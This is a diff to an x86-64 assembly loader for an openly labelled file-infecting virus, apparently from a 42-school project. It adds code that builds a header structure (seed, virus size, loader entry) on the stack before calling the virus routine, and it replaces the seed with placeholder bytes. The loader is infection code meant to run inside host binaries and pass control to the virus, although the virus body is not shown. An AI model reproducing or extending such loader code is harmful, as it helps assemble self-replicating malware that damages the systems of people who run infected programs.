@@ -6,7 +6,7 @@
 ;    By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+         ;
 ;                                                 +#+#+#+#+#+   +#+            ;
 ;    Created: 2019/02/11 14:08:33 by agrumbac          #+#    #+#              ;
-;    Updated: 2020/12/01 21:28:11 by ichkamo          ###   ########.fr        ;
+;    Updated: 2021/06/15 19:40:20 by ichkamo          ###   ########.fr        ;
 ;                                                                              ;
 ; **************************************************************************** ;
 
@@ -37,8 +37,27 @@ loader_entry:
 	push r15                   ; backup r15
 
 ;----------------------------------; launch infection routines
+
+; space for structure fields
+	sub rsp, end_virus_header - virus_header_struct
+; loader_entry
+	lea r8, [rel loader_entry]
+	mov [rsp + 0x10], r8
+; virus_size
+	lea r9, [rel virus_header_struct + 0x8]
+	mov r9, [r9]
+	mov [rsp + 0x8], r9
+; seed
+	lea r10, [rel virus_header_struct]
+	mov r10, [r10]
+	mov [rsp], r10
+; pass structure address
+	mov rdi, rsp
 call_virus:
 	call virus                 ; call virus (addr rewritten by virus)
+
+; free space for structure fields
+	add rsp, end_virus_header - virus_header_struct
 
 ;----------------------------------; restore registers
 return_to_client:
@@ -61,5 +80,11 @@ jump_back_to_client:
 loader_exit:
 
 virus_header_struct:
-	db 0xD5, 0xEE, 0xF5, 0xE1, 0xAD, 0xDB, 0xDE, 0xFA ; virus seed
+	db 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55 ; virus seed (placeholder)
+	db 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66 ; virus size (placeholder)
+	db 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77 ; loader entry (placeholder)
+	; db 0xD5, 0xEE, 0xF5, 0xE1, 0xAD, 0xDB, 0xDE, 0xFA ; virus seed (placeholder)
+	; dq loader_entry                                   ; virus size (placeholder)
+	; dq loader_entry                                   ; loader entry (placeholder)
+end_virus_header:
 	db "Warning : Copyrighted Virus by __UNICORNS_OF_THE_APOCALYPSE__ <3"
